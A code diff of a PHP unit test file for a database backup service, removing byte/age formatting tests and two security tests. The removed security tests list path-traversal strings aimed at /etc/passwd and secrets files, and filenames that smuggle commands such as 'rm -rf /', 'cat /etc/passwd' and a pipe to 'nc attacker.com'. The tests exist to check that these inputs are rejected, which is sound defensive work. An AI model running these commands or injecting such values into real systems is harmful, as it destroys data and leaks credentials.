@@ -268,44 +268,6 @@ class DatabaseServiceTest extends TestCase
 
     // ==================== FORMAT HELPER TESTS ====================
 
-    public function testFormatBytesCorrectly(): void
-    {
-        $testCases = [
-            [0, '0.00 B'],
-            [500, '500.00 B'],
-            [1024, '1.00 KB'],
-            [1536, '1.50 KB'],
-            [1048576, '1.00 MB'],
-            [1073741824, '1.00 GB'],
-        ];
-
-        foreach ($testCases as [$bytes, $expected]) {
-            $result = $this->callPrivateMethod($this->service, 'formatBytes', [$bytes]);
-            $this->assertEquals($expected, $result);
-        }
-    }
-
-    public function testFormatAgeReturnsCorrectStrings(): void
-    {
-        $now = time();
-
-        // Just now
-        $result = $this->callPrivateMethod($this->service, 'formatAge', [$now - 30]);
-        $this->assertEquals('Just now', $result);
-
-        // Minutes ago
-        $result = $this->callPrivateMethod($this->service, 'formatAge', [$now - 120]);
-        $this->assertEquals('2 minutes ago', $result);
-
-        // Hours ago
-        $result = $this->callPrivateMethod($this->service, 'formatAge', [$now - 7200]);
-        $this->assertEquals('2 hours ago', $result);
-
-        // Days ago
-        $result = $this->callPrivateMethod($this->service, 'formatAge', [$now - 172800]);
-        $this->assertEquals('2 days ago', $result);
-    }
-
     // ==================== BACKUP STATISTICS TESTS ====================
 
     public function testGetBackupStatsReturnsCorrectStructure(): void
@@ -401,42 +363,4 @@ class DatabaseServiceTest extends TestCase
         $this->assertStringContainsString('not found', $result['message']);
     }
 
-    // ==================== SECURITY TESTS ====================
-
-    public function testSecurityPathTraversalIsBlocked(): void
-    {
-        $attackVectors = [
-            '../../../etc/passwd',
-            '..\\..\\..\\windows\\system32\\config\\sam',
-            '/var/www/html/secrets/db_password.txt',
-            'backup.sql.gz/../../../etc/passwd',
-        ];
-
-        foreach ($attackVectors as $vector) {
-            // Test restore
-            $result = $this->service->restoreBackup($vector);
-            $this->assertFalse($result['success'], 'Restore should block: ' . $vector);
-
-            // Test delete
-            $result = $this->service->deleteBackup($vector);
-            $this->assertFalse($result['success'], 'Delete should block: ' . $vector);
-        }
-    }
-
-    public function testSecurityCommandInjectionIsBlocked(): void
-    {
-        // Attempt command injection via filename
-        $attackFilenames = [
-            'postgres_app_20260126_120530.sql.gz; rm -rf /',
-            'postgres_app_20260126_120530.sql.gz && cat /etc/passwd',
-            'postgres_app_20260126_120530.sql.gz | nc attacker.com 1234',
-            'postgres_app_$(whoami)_20260126_120530.sql.gz',
-        ];
-
-        foreach ($attackFilenames as $filename) {
-            // Validation should reject these patterns
-            $result = $this->callPrivateMethod($this->service, 'validateBackupFilename', [$filename]);
-            $this->assertFalse($result, 'Should reject command injection: ' . $filename);
-        }
-    }
 }
